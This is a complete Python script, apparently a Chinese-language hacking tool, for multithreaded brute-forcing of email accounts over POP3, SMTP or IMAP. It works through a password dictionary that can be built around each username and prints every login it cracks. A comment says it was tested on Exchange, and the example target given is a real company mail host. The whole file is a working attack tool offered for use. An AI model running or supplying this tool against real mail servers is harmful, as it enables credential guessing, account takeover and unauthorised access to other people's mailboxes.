#!/usr/bin/env python
#coding:utf-8
#Author:se55i0n
#在exchange下测试通过

import os
import sys
import time
import queue
import poplib
import smtplib
import imaplib
import argparse
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing.dummy import Lock

class EmailScanner(object):
	def __init__(self, host, user, protocol, threads, ssl):
		self.W      = '\033[0m'
		self.G      = '\033[1;32m'
		self.O      = '\033[1;33m'
		self.R      = '\033[1;31m'
		self.time   = time.time()
		self.host   = host
		self.user   = user
		self.proto  = protocol
		self.uname  = ''
		self.pwd    = []
		self.result = []
		self.ssl    = ssl
		self.thread = threads
		self.lock   = Lock()
		
	def get_user(self):
		try:
			if os.path.isfile(self.user):
				with open(self.user) as f:
					for i in f.readlines():
						yield i.strip()
			else:
				yield self.user
		except Exception as e:
			print e

	def get_pwd(self, user):
		try:
			path = os.path.dirname(os.path.abspath('{}'.format(sys.argv[0])))
			with open(path + '/dict/pwd.txt') as f:
				for i in f.readlines():
					self.pwd.append(i.strip().replace('{user}', user)) 
				return self.pwd
		except Exception as e:
			print e

	def pop(self, user, pwd):	
		try:
			server = poplib.POP3_SSL(self.host) if self.ssl else poplib.POP3(self.host)
			server.user(user)
			if '+OK' in server.pass_(pwd):
				print '{}[+] 发现一个用户: {}  {}{}'.format(self.G, user, pwd, self.W)
				self.result.append('[+] {}  {}'.format(user, pwd))
		except Exception as e:
			pass
		finally:
			server.quit()
			

	def smtp(self, user, pwd):
		try:
			server = smtplib.SMTP_SSL(self.host) if self.ssl else smtplib.SMTP(self.host)
			if ' successful' in server.login(user, pwd)[1]:
				print '{}[+] 发现一个用户: {}  {}{}'.format(self.G, user, pwd, self.W)
				self.result.append('[+] {}  {}'.format(user, pwd))
		except Exception as e:
			pass
		finally:
			server.quit()

	def imap(self, user, pwd):
		try:
			server = imaplib.IMAP4_SSL(self.host) if self.ssl else imaplib.IMAP4(self.host)
			if ' OK' in server.login(user, pwd):
				print '{}[+] 发现一个用户: {}  {}{}'.format(self.G, user, pwd, self.W)
				self.result.append('[+] {}  {}'.format(user, pwd))
		except Exception as e:
			pass
		finally:
			server.logout()

	def handle(self, user, pwd):
		self.lock.acquire()
		print u'[-] 正在尝试:  {}  {}'.format(user.ljust(12), pwd)
		self.lock.release()
		if self.proto == 'pop3':
			self.pop(user, pwd)
		elif self.proto == 'smtp':
			self.smtp(user, pwd)
		else:
			self.imap(user, pwd)

	def start(self,  pwd):
		try:
			self.handle(self.uname, pwd)
		except Exception as e:
			pass

	def start_thread(self):
		try:
			pool = ThreadPool(processes=self.thread)            
			pool.map_async(self.start, self.get_pwd(self.uname)).get(0xffff)
			pool.close()
			pool.join()
		except Exception as e:
			pass
		except KeyboardInterrupt:
			print u'\n[-] 用户终止扫描...' 
			sys.exit(1)

	def run(self):
		user = self.get_user()
		try:
			while True:
				self.uname = user.next()
				self.start_thread()
				self.pwd = []
				self.status = False
		except Exception as e:
			pass
		finally:
			print '-'*67
			print u'{}[-] 扫描完成耗时: {} 秒.{}'.format(self.O, time.time()-self.time, self.W)
			print '-'*67
			if self.result:
				for i in self.result:
					print self.G + i + self.W

def banner():
    banner = '''
    ______                _ __
   / ____/___ ___  ____ _(_) /_____________ _____  ____  ___  _____
  / __/ / __ `__ \/ __ `/ / / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
 / /___/ / / / / / /_/ / / (__  ) /__/ /_/ / / / / / / /  __/ /
/_____/_/ /_/ /_/\__,_/_/_/____/\___/\__,_/_/ /_/_/ /_/\___/_/
    '''
    print '\033[1;34m'+ banner +'\033[0m'
    print '-'*67

def main():
    banner()
    parser = argparse.ArgumentParser(description='Example: python {} host username/userlistfile [-ssl 1]'.format(sys.argv[0]))
    parser.add_argument('host', help=u'email.baidu.com')
    parser.add_argument('-u', dest='uname', help=u'用户名或用户名文件')
    parser.add_argument('-p', dest='protocol', choices=['pop3','smtp','imap'], help=u'待爆破邮箱协议')
    parser.add_argument('-t', type=int, default=10, dest='threads', help=u'线程数(默认10)')
    parser.add_argument('-ssl', default=False, dest='ssl', choices=['1'], help='ssl')
    args   = parser.parse_args()
    myscan = EmailScanner(args.host, args.uname, args.protocol, args.threads, args.ssl)
    myscan.run()

if __name__ == '__main__':
    main()
	